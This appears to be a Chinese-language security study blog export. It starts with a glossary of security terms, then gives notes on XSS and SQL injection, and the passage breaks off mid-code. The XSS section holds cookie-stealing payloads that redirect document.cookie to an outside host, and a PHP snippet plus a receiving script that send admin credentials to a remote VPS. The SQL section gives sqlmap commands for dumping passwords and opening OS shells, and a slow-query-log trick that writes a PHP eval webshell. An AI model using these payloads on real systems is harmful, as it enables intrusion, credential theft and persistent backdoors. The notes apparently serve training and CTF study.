沙箱\n沙箱是一种用于安全的运行程序的机制。它常常用来执行那些非可信的程序。\n非可信程序中的恶意代码对系统的影响将会被限制在沙箱内而不会影响到系统的其它部分。\n 沙箱逃逸\n一种识别沙箱环境，并利用静默、欺骗等技术，绕过沙箱检测的现象\n 网络靶场\n主要是指通过虚拟环境与真实设备相结合，模拟仿真出真实赛博网络空间攻防作战环境，能够支撑攻防演练、安全教育、网络空间作战能力研究和网络武器装备验证试验平台。\n 2．技术与服务\n 加密技术\n加密技术包括两个元素：算法和密钥。\n算法是将普通的文本与一串数字（密钥）的结合，产生不可理解的密文的步骤，密钥是用来对数据进行编码和解码的一种算法。\n密钥加密技术的密码体制分为对称密钥体制和非对称密钥体制两种。相应地，对数据加密的技术分为两类，即对称加密（私人密钥加密）和非对称加密（公开密钥加密）。对称加密的加密密钥和解密密钥相同，而非对称加密的加密密钥和解密密钥不同，加密密钥可以公开而解密密钥需要保密。\n 黑名单\n顾名思义，黑名单即不好的名单，凡是在黑名单上的软件、IP地址等，都被认为是非法的。\n 白名单\n与黑名单对应，白名单即“好人”的名单，凡是在白名单上的软件、IP等，都被认为是合法的，可以在计算机上运行。\n 内网\n通俗的讲就是局域网，比如网吧、校园网、公司内部网等都属于此类。\n查看IP地址，如果是在以下三个范围之内，就说明我们是处于内网之中的：\n10.0.0.0—10.255.255.255\n172.16.0.0—172.31.255.255\n192.168.0.0—192.168.255.255\n 外网\n直接连入Internet（互连网），可以与互连网上的任意一台电脑互相访问。\n 边界防御\n以网络边界为核心的防御模型，以静态规则匹配为基础，强调把所有的安全威胁都挡在外网。\n 南北向流量\n通常指数据中心内外部通信所产生的的流量。\n 东西向流量\n通常指数据中心内部不同主机之间互相通信所产生的的流量。\n 规则库\n网络安全的核心数据库，类似于黑白名单，用于存储大量安全规则，一旦访问行为和规则库完成匹配，则被认为是非法行为。所以有人也将规则库比喻为网络空间的法律。\n 下一代\n网络安全领域经常用到，用于表示产品或者技术有较大幅度的创新，在能力上相对于传统方法有明显的进步，通常缩写为NG（Next Gen）。\n例如NGFW（下一代防火墙）、NGSOC（下一代安全管理平台）等。\n 大数据安全分析\n区别于传统被动规则匹配的防御模式，以主动收集和分析大数据的方法，找出其中可能存在的安全威胁，因此也称数据驱动安全。\n该理论最早由奇安信于2015年提出。\n EPP\n全称Endpoint Protection Platform，翻译为端点保护平台，部署在终端设备上的安全防护解决方案,用于防止针对终端的恶意软件、恶意脚本等安全威胁，通常与EDR进行联动。\n EDR\n全称Endpoint Detection&amp;Response，即端点检测与响应，通过对端点进行持续检测，同时通过应用程序对操作系统调用等异常行为分析，检测和防护未知威胁，最终达到杀毒软件无法解决未知威胁的目的。\n NDR\n全称Network Detection&amp;Response，即网络检测与响应，通过对网络侧流量的持续检测和分析，帮助企业增强威胁响应能力，提高网络安全的可见性和威胁免疫力。\n 安全可视化\n指在网络安全领域中的呈现技术，将网络安全加固、检测、防御、响应等过程中的数据和结果转换成图形界面，并通过人机交互的方式进行搜索、加工、汇总等操作的理论、方法和技术。\n NTA\n网络流量分析（NTA）的概念是Gartner于2013年首次提出的，位列五种检测高级威胁的手段之一。\n它融合了传统的基于规则的检测技术，以及机器学习和其他高级分析技术，用以检测企业网络中的可疑行为，尤其是失陷后的痕迹。\n MDR\n全称Managed Detection&amp;Response，即托管检测与响应，依靠基于网络和主机的检测工具来识别恶意模式。\n此外，这些工具通常还会从防火墙之内的终端收集数据，以便更全面地监控网络活动。\n 应急响应\n通常是指一个组织为了应对各种意外事件的发生所做的准备以及在事件发生后所采取的措施。\n XDR\n通常指以检测和响应技术为核心的网络安全策略的统称，包括EDR、NDR、MDR等。\n 安全运营\n贯穿产品研发、业务运行、漏洞修复、防护与检测、应急响应等一系列环节，实行系统的管理方法和流程，将各个环节的安全防控作用有机结合，保障整个业务的安全性。\n 威胁情报\n根据Gartner的定义，威胁情报是某种基于证据的知识，包括上下文、机制、标示、含义和能够执行的建议，这些知识与资产所面临已有的或酝酿中的威胁或危害相关，可用于资产相关主体对威胁或危害的响应或处理决策提供信息支持。根据使用对象的不同，威胁情报主要分为人读情报和机读情报。\n TTP\n主要包括三要素，战术Tactics、技术Techniques和过程Procedures，是描述高级威胁组织及其攻击的重要指标，作为威胁情报的一种重要组成部分，TTP可为安全分析人员提供决策支撑。\n IOC\n中文名为失陷标示：用以发现内部被APT团伙、木马后门、僵尸网络控制的失陷主机，类型上往往是域名、URL等。\n目前而言，IOC是应用最为广泛的威胁情报，因为其效果最为直接。一经匹配，则意味着存在已经失陷的主机。\n 上下文\n从文章的上下文引申而来，主要是指某项威胁指标的关联信息，用于实现更加精准的安全匹配和检测。\n STIX\nSTIX是一种描述网络威胁信息的结构化语言，能够以标准化和结构化的方式获取更广泛的网络威胁信息，常用于威胁情报的共享与交换，目前在全球范围内使用最为广泛。\nSTIX在定义了8中构件的1.0版本基础上，已经推出了定义了12中构件的2.0版本。\n 杀伤链\n杀伤链最早来源于军事领域，用于描述进攻一方各个阶段的状态。\n在网络安全领域，这一概念最早由洛克希德-马丁公司提出，英文名称为Kill Chain，也称作网络攻击生命周期，包括侦查追踪、武器构建、载荷投递、漏洞利用、安装植入、命令控制、目标达成等七个阶段，来识别和防止入侵。\n ATT&amp;CK\n可以简单理解为描述攻击者技战术的知识库。\nMITRE在2013年推出了该模型，它是根据真实的观察数据来描述和分类对抗行为。\nATT&amp;CK将已知攻击者行为转换为结构化列表，将这些已知的行为汇总成战术和技术，并通过几个矩阵以及结构化威胁信息表达式（STIX）、指标信息的可信自动化交换（TAXII）来表示。\n 钻石模型\n钻石模型在各个领域的应用都十分广泛，在网络安全领域，钻石模型首次建立了一种将科学原理应用于入侵分析的正式方法：\n可衡量、可测试和可重复——提供了一个对攻击活动进行记录、（信息）合成、关联的简单、正式和全面的方法。\n这种科学的方法和简单性可以改善分析的效率、效能和准确性。\n 关联分析\n又称关联挖掘，就是在交易数据、关系数据或其他信息载体中，查找存在于项目集合或对象集合之间的频繁模式、关联、相关性或因果结构。\n在网络安全领域主要是指将不同维度、类型的安全数据进行关联挖掘，找出其中潜在的入侵行为。\n 态势感知\n是一种基于环境的、动态、整体地洞悉安全风险的能力，是以安全大数据为基础，从全局视角提升对安全威胁的发现识别、理解分析、响应处置能力的一种方式，最终是为了决策与行动，是安全能力的落地。\n 探针\n也叫作网络安全探针或者安全探针，可以简单理解为赛博世界的摄像头，部署在网络拓扑的关键节点上，用于收集和分析流量和日志，发现异常行为，并对可能到来的攻击发出预警。\n 网络空间测绘\n用搜索引擎技术来提供交互，让人们可以方便的搜索到网络空间上的设备。\n相对于现实中使用的地图，用各种测绘方法描述和标注地理位置，用主动或被动探测的方法，来绘制网络空间上设备的网络节点和网络连接关系图，及各设备的画像。\n SOAR\n全称Security Orchestration ,Automation and Response，即安全编排自动化与响应，主要通过剧本化、流程化的指令，对入侵行为采取的一系列自动化或者半自动化响应处置动作。\n UEBA\n全称User and Entity Behavior Analytics，即用户实体行为分析，一般通过大数据分析的方法，分析用户以及IT实体的行为，从而判断是否存在非法行为。\n 内存保护\n内存保护是操作系统对电脑上的内存进行访问权限管理的一个机制。内存保护的主要目的是防止某个进程去访问不是操作系统配置给它的寻址空间。\n RASP\n全称Runtime application self-protection，即应用运行时自我保护。\n在2014年时由Gartner提出，它是一种新型应用安全保护技术，它将保护程序像疫苗一样注入到应用程序中，应用程序融为一体，能实时检测和阻断安全攻击，使应用程序具备自我保护能力，当应用程序遭受到实际攻击伤害，就可以自动对其进行防御，而不需要进行人工干预。\n 包检测\n对于流量包、数据包进行拆包、检测的行为。\n 深度包检测\nDeep Packet Inspection，缩写为DPI，又称完全数据包探测（complete packet inspection）或信息萃取（Information eXtraction，IX），是一种计算机网络数据包过滤技术，用来检查通过检测点之数据包的数据部分（亦可能包含其标头），以搜索不匹配规范之协议、病毒、垃圾邮件、入侵迹象。\n 全流量检测\n全流量主要体现在三个“全”上，即全流量采集与保存，全行为分析以及全流量回溯。\n通过全流量分析设备，实现网络全流量采集与保存、全行为分析与全流量回溯，并提取网络元数据上传到大数据分析平台实现更加丰富的功能。\n 元数据\n元数据（Metadata），又称中介数据、中继数据，为描述数据的数据（data about data），主要是描述数据属性（property）的信息，用来支持如指示存储位置、历史数据、资源查找、文件记录等功能。\n 欺骗检测\n以构造虚假目标来欺骗并诱捕攻击者，从而达到延误攻击节奏，检测和分析攻击行为的目的。\n 微隔离\n顾名思义是细粒度更小的网络隔离技术，能够应对传统环境、虚拟化环境、混合云环境、容器环境下对于东西向流量隔离的需求，重点用于阻止攻击者进入企业数据中心网络内部后的横向平移。\n 逆向\n常见于逆向工程或者逆向分析，简单而言，一切从产品中提取原理及设计信息并应用于再造及改进的行为，都是逆向工程。\n在网络安全中，更多的是调查取证、恶意软件分析等。\n 无代理安全\n在终端安全或者虚拟化安全防护中，往往需要在每一台主机或者虚机上安装agent（代理程序）来实现，这种方式往往需要消耗大量的资源。\n而无代理安全则不用安装agent，可以减少大量的部署运维工作，提升管理效率。\n CWPP\n全称Cloud Workload Protection Platform，即云工作负载保护平台，主要是指对云上应用和工作负载（包括虚拟主机和容器主机上的工作负载）进行保护的技术，实现了比过去更加细粒度的防护，是现阶段云上安全的最后一道防线。\n CSPM\n云安全配置管理，能够对基础设施安全配置进行分析与管理。这些安全配置包括账号特权、网络和存储配置、以及安全配置（如加密设置）。如果发现配置不合规，CSPM会采取行动进行修正。\n CASB\n全称Cloud Access Security Broker，即云端接入安全代理。作为部署在客户和云服务商之间的安全策略控制点，是在访问基于云的资源时企业实施的安全策略。\n 防爬\n意为防爬虫，主要是指防止网络爬虫从自身网站中爬取信息。网络爬虫是一种按照一定的规则，自动地抓取网络信息的程序或者脚本。\n 安全资源池\n安全资源池是多种安全产品虚拟化的集合，涵盖了服务器终端、网络、业务、数据等多种安全能力。\n IAM\n全称为Identity and Access Management，即身份与访问管理，经常也被叫做身份认证。\n 4A\n即认证Authentication、授权Authorization、账号Account、审计Audit，即融合统一用户账号管理、统一认证管理、统一授权管理和统一安全审计四要素后的解决方案将涵盖单点登录（SSO）等安全功能。\nAccessControllist（ACL）\n访问控制列表。\n 多因子认证\n主要区别于单一口令认证的方式，要通过两种以上的认证机制之后，才能得到授权，使用计算机资源。\n例如，用户要输入PIN码，插入银行卡，最后再经指纹比对，通过这三种认证方式，才能获得授权。这种认证方式可以降低单一口令失窃的风险，提高安全性。\n 特权账户管理\n简称PAM。由于特权账户往往拥有很高的权限，因此一旦失窃或被滥用，会给机构带来非常大的网络安全风险。所以，特权账户管理往往在显得十分重要。\n其主要原则有：杜绝特权凭证共享、为特权使用赋以个人责任、为日常管理实现最小权限访问模型、对这些凭证执行的活动实现审计功能。\n 零信任\n零信任并不是不信任，而是作为一种新的身份认证和访问授权理念，不再以网络边界来划定可信或者不可信，而是默认不相信任何人、网络以及设备，采取动态认证和授权的方式，把访问者所带来的的网络安全风险降到最低。\n SDP\n全称Software Defined Perimeter，即软件定义边界，由云安全联盟基于零信任网络提出，是围绕某个应用或某一组应用创建的基于身份和上下文的逻辑访问边界。\n Security as a Service\n安全即服务，通常可理解为以SaaS的方式，将安全能力交付给客户。\n 同态加密\n同态加密是一类具有特殊自然属性的加密方法，此概念是Rivest等人在20世纪70年代首先提出的，与一般加密算法相比，同态加密除了能实现基本的加密操作之外，还能实现密文间的多种计算功能。\n 量子计算\n是一种遵循量子力学规律调控量子信息单元进行计算的新型计算模式，目前已经逐渐应用于加密和通信传输。\n 可信计算\n是一项由可信计算组（可信计算集群，前称为TCPA）推动和开发的技术。\n可信计算是在计算和通信系统中广泛使用基于硬件安全模块支持下的可信计算平台，以提高系统整体的安全性。\n 拟态防御\n核心实现是一种基于网络空间内生安全机理的动态异构冗余构造（Dynamic Heterogeneous Redundancy，DHR），为应对网络空间中基于未知漏洞、后门或病毒木马等的未知威胁，提供具有普适创新意义的防御理论和方法。\n 区块链\n英文名为blockchain，它是一个共享数据库，存储于其中的数据或信息，具有“不可伪造”、“全程留痕”、“可以追溯”、“公开透明”、“集体维护”等特征。\n 远程浏览器\n鉴于浏览器往往成为黑客攻击的入口，因此将浏览器部署在远程的一个“浏览器服务器池”中。\n这样一来，这些浏览器所在的服务器跟用户所在环境中的终端和网络是隔离的，从而使得客户所在网络的暴露面大大降低。\n这种服务也类似于虚拟桌面、云手机等产品。\n 云手机\n云手机采用全新的VMI（Virtual Mobile Infrastructure虚拟移动设施，与PC云桌面类似）技术，为员工提供一个独立的移动设备安全虚拟手机，业务应用和数据仅在服务端运行和存储，个人终端上仅做加密流媒体呈现和触控，从而有效保障企业数据的安全性。\n 风控\n也称大数据风控，是指利用大数据分析的方法判断业务可能存在的安全风险，目前该技术主要用于金融信贷领域，防止坏账的发生。\n 渗透测试\n为了证明网络防御按照预期计划正常运行而提供的一种机制，通常会邀请专业公司的攻击团队，按照一定的规则攻击既定目标，从而找出其中存在的漏洞或者其他安全隐患，并出具测试报告和整改建议。\n其目的在于不断提升系统的安全性。\n 安全众测\n借助众多白帽子的力量，针对目标系统在规定时间内进行漏洞悬赏测试。\n您在收到有效的漏洞后，按漏洞风险等级给予白帽子一定的奖励。通常情况下是按漏洞付费，性价比较高。\n同时，不同白帽子的技能研究方向可能不同，在进行测试的时候更为全面。\n 内生安全\n由奇安信集团董事长齐向东在2019北京网络安全大会上首次提出，指的是不断从信息化系统内生长出的安全能力，能伴随业务的增长而持续提升，持续保证业务安全。\n内生安全有三个特性，即依靠信息化系统与安全系统的聚合、业务数据与安全数据的聚合以及IT人才和安全人才的聚合，从信息化系统的内部，不断长出自适应、自主和自成长的安全能力。\n 内生安全框架\n为推动内生安全的落地，奇安信推出了内生安全框架。\n该框架从顶层视角出发，支撑各行业的建设模式从“局部整改外挂式”，走向“深度融合体系化”；从工程实现的角度，将安全需求分步实施，逐步建成面向未来的安全体系；内生安全框架能够输出实战化、体系化、常态化的安全能力，构建出动态防御、主动防御、纵深防御、精准防护、整体防控、联防联控的网络安全防御体系。\n内生安全框架包含了总结出了29个安全区域场景和79类安全组件。\n PPDR\n英文全称为Policy Protection Detection Response，翻译为策略、防护、检测和响应。\n主要以安全策略为核心，通过一致性检查、流量统计、异常分析、模式匹配以及基于应用、目标、主机、网络的入侵检查等方法进行安全漏洞检测。\n CARTA\n全称为Continuous Adaptive Riskand Trust Assessment，即持续自适应风险与信任评估旨在通过动态智能分析来评估用户行为，放弃追求完美的安全，不能要求零风险，不要求100%信任，寻求一种0和1之间的风险与信任的平衡。\nCARTA战略是一个庞大的体系，其包括大数据、AI、机器学习、自动化、行为分析、威胁检测、安全防护、安全评估等方面。\n SASE\n全称为Secure Access Service Edge，即安全访问服务边缘，Gartner将其定义为一种基于实体的身份、实时上下文、企业安全/合规策略，以及在整个会话中持续评估风险/信任的服务。\n实体的身份可与人员、人员组（分支办公室）、设备、应用、服务、物联网系统或边缘计算场地相关联。\n SDL\n全称为Security Development Lifecycle，翻译为安全开发生命周期，是一个帮助开发人员构建更安全的软件和解决安全合规要求的同时降低开发成本的软件开发过程，最早由微软提出。\n DevSecOps\n全称为Development Security Operations，可翻译为安全开发与运维。\n它强调在DevOps计划刚启动时就要邀请安全团队来确保信息的安全性，制定自动安全防护计划，并贯穿始终，实现持续IT防护。\n 代码审计\n顾名思义就是检查源代码中的安全缺陷，检查程序源代码是否存在安全隐患，或者有编码不规范的地方，通过自动化工具或者人工审查的方式，对程序源代码逐条进行检查和分析，发现这些源代码缺陷引发的安全漏洞，并提供代码修订措施和建议。\n NTLM验证\nNTLM（NT LAN Manager）是微软公司开发的一种身份验证机制，从NT4开始就一直使用，主要用于本地的帐号管理。\n MTTD\n平均检测时间。\n MTTR\n平均响应时间。\n CVE\n全称Common Vulnerabilities and Exposures，由于安全机构Mitre维护一个国际通用的漏洞唯一编号方案，已经被安全业界广泛接受的标准。\n 软件加壳\n“壳”是一段专门负责保护软件不被非法修改或反编译的程序。\n它们一般都是先于程序运行，拿到控制权，然后完成它们保护软件的任务。\n经过加壳的软件在跟踪时已无法看到其真实的十六进制代码，因此可以起到保护软件的目的。\n CNVD\n国家信息安全漏洞共享平台，由国家计算机应急响应中心CNCERT维护，主要负责统一收集、管理国内的漏洞信息，其发布的漏洞编号前缀也为CNVD。\n 数据脱敏\n数据脱敏是指对某些敏感信息通过脱敏规则进行数据的变形，实现敏感隐私数据的可靠保护，主要用于数据的共享和交易等涉及大范围数据流动的场景。\n GDPR\n《通用数据保护条例》（General Data Protection Regulation，简称GDPR）为欧洲联盟的条例，前身是欧盟在1995年制定的《计算机数据保护法》。\n CCPA\n美国加利福尼亚州消费者隐私保护法案。\n SRC\n即Security Response Center，中文名为安全应急响应中心，主要职责为挖掘并公开收集机构存在的漏洞和其他安全隐患。\n CISO\n有时也被叫做CSO，即首席信息安全官，为机构的主要安全负责人。\n IPC管道\n为了更好地控制和处理不同进程之间的通信和数据交换，系统会通过一个特殊的连接管道来调度整个进程。\n SYN包\nTCP连接的第一个包，非常小的一种数据包。SYN攻击包括大量此类的包，由于这些包看上去来自实际不存在的站点，因此无法有效进行处理。\n IPC$\n是共享“命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限，在远程管理计算机和查看计算机的共享资源时使用。\n shell\n指的是一种命令指行环境，是系统与用户的交换方式界面。简单来说，就是系统与用户“沟通”的环境。\n我们平时常用到的DOS，就是一个shell。（Windows2000是cmd.exe）\n ARP\n地址解析协议（Address Resolution Protocol）此协议将网络地址映射到硬件地址。\n","tags":["小迪"]},{"title":"09通用-XSS","url":"/2024/05/28/09%E9%80%9A%E7%94%A8-XSS/","content":" XSS\n在已有XSS知识上做的一些补充\n\n产生的地方\n\n\n数据交互的地方\n\nget、post、headers\n反馈与浏览\n富文本编辑器\n各类标签插入和自定义\n\n\n数据输出的地方\n\n用户资料\n关键词、标签、说明\n文件上传\n\n\n\n\n分类\n\n反射型（非持久型）\n存储型（持久型）\nDOM型\nmXSS（突变型XSS）\n\n简单来说就是本身被过滤成其他字符，但是在转发的时候重新识别转换回来了\n\n文章\nUXSS（通用型XSS）\n\n利用浏览器或者浏览器拓展漏洞来来制造产生XSS并执行代码的一种攻击类型\nCVE-2021-34506\nBV1FM4y1M7a8\n\nFlash XSS\n\nswf反编译：JPEXS Free Flash Decompiler\n可查询：ExternalInterface.call看哪里调用JS代码\n\nPDFXSS\n\nPDF编辑的时候插入动作，此时可以插入JavaScript脚本，写入恶意的XSS代码后，通过文件上传获取直链，访问后会触发\n上传到可信网站应用于钓鱼\n\nUTF-7 XSS\nMHTML XSS\nCSS XSS\nVBScript XSS\n获取Cookies：https://xss.pt/xss.php\n有一种可能：获取到的Cookies不全（比如httponly、存在session）\nkali上有beef-xss\n快速构建基于BeEF的钓鱼平台\n\n挖掘思路\n\n个人信息，留言板，评论等，多注意观察URL变化，XSS是很好防御的，加个过滤就好了\n\n补充\n\nxxx.html?参数=javascript:alert(&#x27;1&#x27;)\n以JavaScript代码执行\n&lt;script&gt; window.location.href=&#x27;http://xxx&#x27;+document.cookie&lt;/script&gt;\nwindow.location.href=''：自动跳转到该网址\ndocument.cookie：获取Cookies\n&lt;script&gt;    $(&#x27;.laytable-cell-1-0-1&#x27;).each(function(index,value)&#123;        if (value.innerHTML.indexOf(&#x27;ctf&#x27;+&#x27;show&#x27;)&gt;-1) &#123;            window.location.href = &#x27;http://xxx/get.php?c=&#x27;+CSSMathValue.innerHTML;        &#125;    &#125;);&lt;/script&gt;\n\nctfshow329\n密码选项来源于laytable-cell-1-0-1这个标签\n\n针对于Cookies失效的问题，则不获取Cookies，在触发JS的时候直接得到想要的内容（利用JS获取当前页面源代码）\n&lt;script&gt;$.ajax(&#123;url:&#x27;http://127.0.0.1/api/change.php&#x27;,type:&#x27;post&#x27;,data:&#123;p:&#x27;123&#x27;&#125;&#125;);&lt;/script&gt;\n利用Ajax通过post传参\nXSS总结\n\nXSS后台植入Cookies&amp;表单劫持\n\n条件：前期已取得权限\n代码中插入这段\n$up=&#x27;&lt;script src=http://远程vps地址/get.php?user=&#x27;.$admin_name.&#x27;&amp;pass=&#x27;.$admin_pass.&#x27;&gt;&lt;/script&gt;&#x27;;echo $up;\n而远程vps的get.php中写入\n&lt;?php    $u=$_GET[&#x27;user&#x27;];\t$p=$_GET[&#x27;pass&#x27;];\t$myfile=fopen(&quot;newfile.txt&quot;,&quot;w+&quot;);\tfwrite($myfile,$u);\tfwrite($myfile,&#x27;|&#x27;);\tfwrite($myfile,$p);\tfwrite($myfile,&#x27;\\n&#x27;);\tfclose($myfile);?&gt;\n达到权限维持\n\n制作自解压，然后利用XSS\n\n\n\n\n\n还可以使用Restorator修改图标，还有做免杀\n\n第2次执行这个压缩包时，前一次解压出来的木马已经存在，所以解压前运行木马文件可以正常上线\n\n\n绕过&amp;防护\n\n\n\n过滤一些危险字符，转义&amp;、&lt;、&gt;、&quot;、'等危险字符\n自定义过滤函数引用\n\n\nHTTP-only Cookie\nphp设置httponly\nphp.ini设置或代码引用\nsession.cookie_httponly=1ini_set(&quot;session.cookie_httponly&quot;,1)\n\n\n设置CSP（Content Security Policy）\nhttp://t.csdnimg.cn/CBYJQ\nheader(&quot;Content-Security-Policy:img-src &#x27;self&#x27; &quot;);//只允许加载本地源图片\n\n\n输入内容长度限制、实体转义等\n\n\n","tags":["小迪"]},{"title":"07通用-SQL注入","url":"/2024/03/30/07%E9%80%9A%E7%94%A8-SQL%E6%B3%A8%E5%85%A5/","content":" SQLmap\n\n不支持NoSQL、Redis\n\n-u &quot;&lt;网址&gt;&quot;#指定网址--data &quot;&lt;具体的数据&gt;&quot;#POST方式提交数据(--data &quot;page=1&amp;id=2&quot;)--cookie &quot;&lt;具体的数据&gt;&quot;#cookie注入，注意用;分开(--cookies=”ID=465169; security=low”)--purge#清除缓存--privileges#查看权限--is-dba#是否是数据库管理员--dbs#获取数据库名--tables#获取数据库下的表，常搭配-D使用-D &quot;&lt;数据库名&gt;&quot;#指定数据库-T &quot;&lt;表名&gt;&quot;#指定表名--dump -C &quot;&lt;列名&gt;,&lt;列名&gt;&quot;#指定列名-r &lt;数据包文件&gt;#以数据包形式进行注入（解决特定范围）------执行命令--os#指定系统--os-cmd=id#执行系统命令--os-shell#系统交互shell--file-read/write#读/写文件-sql-shell#执行指定sql命令-reg-read#读取win系统注册表------脚本--tamper=&lt;脚本名称&gt;举例：base64encode.pyunmagicquotes.py(宽字节)详情参考https://www.cnblogs.com/bmjoker/p/9326258.html的#建议\n\n数据包中在注入的地方加入*号\n\nSQLmap中文手册\nSQLmap使用参数\n简单的注入流程：\n\n读取数据库版本，当前用户，当前数据库\n\nsqlmap.py -u http://www.xxx.com/test/php?p=2 -f -b --current-user --current-db -v 1\n\n判断当前数据库用户权限（高权限才能进行文件的读取、命令执行等其他功能）\n\nsqlmap.py -u http://www.xxx.com/test/php?p=2 --privileges -U 用户名 -v 1sqlmap.py -u http://www.xxx.com/test/php?p=2 --is-dba -U 用户名 -v 1\n\n读取所有数据库用户或指定数据库用户的密码\n\nsqlmap.py -u http://www.xxx.com/test/php?p=2 --users --passwords -v 2sqlmap.py -u http://www.xxx.com/test/php?p=2 --passwords -U root -v 2\n\n获取所有数据库\n\nsqlmap.py -u http://www.xxx.com/test/php?p=2 --dbs -v 2\n\n获取指定数据库中的所有表\n\nsqlmap.py -u http://www.xxx.com/test/php?p=2 --tables -D mysql -v 2\n\n获取指定数据库名中指定表的字段\n\nsqlmap.py -u http://www.xxx.com/test/php?p=2 --columns -D mysql -T users -v 2\n\n获取指定数据库命中指定表中指定字段的数据\n\nsqlmap.py -u http://www.xxx.com/test/php?p=2 --dump -D mysql -T users -C &quot;username,password&quot; -s &quot;sqlnmapdb.log&quot; -v 2\n\nfile-read读取web文件\n\nsqlmap.py -u http://www.xxx.com/test/php?p=2 --file-read &quot;/etc/password&quot; -v 2\n\nfile-write写入文件到web\n\nsqlmap.py -u http://www.xxx.com/test/php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试\n SQL注入\n为了网站和数据库的安全性，MySQL内置有root最高用户，划分等级，每个用户对应管理一个数据库，这样保证互不关联，从而不会影响到其他数据库的运行\nMySQL两种思路：\n\n非root的注入攻击：常规类的猜解\nroot用户的注入攻击：文件读写操作，跨库查询注入等\n\nMySQL5.0以上版本：自带的数据库名：information_schema\n\ninformation_schema库中的：\nschemata表会记录所有的数据库名（chehema_name）\ntables表会记录所有的表名（table_name）\ncolumns表会记录所有的列名（column_name）\n\n获取相关数据：\n\n数据库版本-看是否符合information_schema查询-version()\n数据库用户-看是否符合root型注入攻击-user()\n当前操作系统-看是否支持大小写或文件路径选择-@@version_compile_os()\n数据库名字-为后期猜解指定数据库下的表、列做准备-database()\n\n\nMySQL配置中的secure-file-priv：限制读取/写入的文件\n\nLinux下：/etc/my.cnf\n\n突破：注入中需要支持SQL执行环境，没有就需要借助PHPmyadmin或能够直接连上对方数据库进行绕过\nset global slow_query_log=1;set global slow_log_file=&#x27;shell路径&#x27;select &#x27;&lt;?php eval($_GET[A])?&gt;&#x27; or SLEEP(11);\n\n因为是用的慢查询日志，所以说只有当查询语句执行的时间要超过系统默认的时间时,该语句才会被记入进慢查询日志。\n时间默认超过多少的称为慢查询日志？\n一般都是通过long_query_time选项来设置这个时间值，时间以秒为单位，可以精确到微秒。如果查询时间超过了这个时间值（默认为10秒），这个查询语句将被记录到慢查询日志中。查看服务器默认时间值方式如下：\nshow global variables like &#x27;%long_query_time%&#x27;\n\n MSSQL\nSQLRecon网络侦查与后渗透测试工具\norder by 4and 1=2 union all select null,null,null,null@@version--获取版本信息db_name()--当前数据库名字user、system_user、current_user、user_name--获取当前用户名@@SERVERNAME--获取服务器主机信息\n PostgreSQL\nPostgreSQL注入\norder by 4and 1=2 union select null,null,null,nullversion()--获取版本信息current_user--获取用户名current_database()--获取当前数据库名\n Oracle\nOracle注入总结\n测回显：and 1=2 union select &#x27;1&#x27;,&#x27;2&#x27; from dual爆库：and 1=2 union select &#x27;1&#x27;,(select table_name from user_tables where rownum=1)from dual模糊爆库：and 1=2 union select &#x27;1&#x27;,(select table_name from user_tables where rownum=1 and table_name like &#x27;%user%&#x27;) from dual爆列名：and 1=2 union select &#x27;1&#x27;,(select column_name from all_tab_columns where rownum=1 and table_name=&#x27;sns_users&#x27;) from dual爆其他列名：and 1=2 union select &#x27;1&#x27;,(select column_name from all_tab_columns where rownum=1 and table_name=&#x27;sns_users&#x27; and column_name not in (&#x27;USER_NAME&#x27;))from dual爆数据：and 1=2 union select user_name,user_pwd from &quot;sns_users&quot;爆其他数据：and 1=2 union select user_name,user_pwd from &quot;sns_users&quot; where USER_NAME&lt;&gt;&#x27;hu&#x27; and user_name&lt;&gt;&#x27;mozhe&#x27;\n MongoDB\nMongoDB查询文档\n（Python），以墨者为例\n&lt;?php$db = $mongo-&gt;mozhe_cms_Authority;$id = $_GET[&#x27;id&#x27;];$query = &quot;var data = db.notice.findOne(&#123;&#x27;id&#x27;:&#x27;$id&#x27;&#125;);return data;&quot;;$obj = $db-&gt;execute($query);&lt;div class=&quot;body&quot;&gt;&lt;div class=&quot;title&quot;&gt;&lt;?php echo $obj[&#x27;retval&#x27;][&#x27;title&#x27;];?&gt;&lt;/div&gt;&lt;div class=&quot;content&quot;&gt;&lt;?php echo $obj[&#x27;retval&#x27;][&#x27;content&#x27;];?&gt;&lt;/div&gt;\n其中findOne({‘id’:‘$id’})，故需先闭合再执行查询语句，即1'}) and …\n测回显：/new_list.php?id=1&#x27;&#125;);return (&#123;title:1,content:&#x27;2爆库：/new_list.php?id=1&#x27;&#125;);return (&#123;title:tojson(db.getCollectionNames()),content:&#x27;1爆字段：/new_list.php?id=1&#x27;&#125;);return (&#123;title:tojson(db.Authority_confidential.find()[0]),content:&#x27;1---db.getCollectionNames()返回的是数组，需要用tojson转换为字符串db.Authority_confidential是当前用的集合（表），find函数用于查询，0是第一条数据\n 数据类型注入\n\n数字型\n\n$sql=&quot;select * from tablea where id = $i&quot;\n\n字符型\n\n$sql=&quot;select * from tablea where id = &#x27;$i&#x27;&quot;\n如果是字符串的话（比如有空格），不加单引号就出错\n\n搜索型\n\n$sql=&quot;select * from tablea where id like &#x27;%$i%&#x27;&quot;\n使用%作为通配符\n\n加密型\n\n数据以加密的密文去发送\n\n格式型\n\n比如JSON\n&lt;?phpif (isset($_POST[&#x27;json&#x27;])) &#123;    $json_str = $_POST[&#x27;json&#x27;];    //&#123;&quot;username&quot;:&quot;admin&quot;&#125;    $json = json_decode($json_str);&#125;$username = $json-&gt;username;$sql = &quot;SELECT * FROM users WHERE username=&#x27;&#123;$username&#125;&#x27;&quot;;\njson=&#123;&quot;username&quot;:&quot;admin&#x27;order by 4#&quot;&#125;\nQ：考虑的是闭合双引号，为什么要闭合单引号？\nA：JSON取得是键值，而不是双引号，代码中的{}是JSON的格式，即括号在这里不起作用，所以只需要考虑单引号\n 宽字节注入\n\naddslashes()\n返回字符串，该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。这些字符是单引号（'）、双引号（&quot;）、反斜线（\\）与NULL（NULL字符）。\n当PHP指令magic_quotes_sybase被设置成on时，意味着插入'时将使用'进行转义。\n\n此时利用宽字节（繁体字符、乱码的字符）来占用两个字节产生绕过\n 提交方式注入\n&lt;?phpheader(&quot;Content-Type:text/html;charset=utf-8&quot;);$get = $_GET[&#x27;g&#x27;];$post = $_POST[&#x27;p&#x27;];$cookie = $_COOKIE[&#x27;c&#x27;];$request = $_REQUEST[&#x27;r&#x27;];$host = $_SERVER[&#x27;HTTP_HOST&#x27;];//当前访问URL地址$user_agent = $_SERVER[&quot;HTTP_USER_AGENT&quot;];//浏览器地址信息$ip = 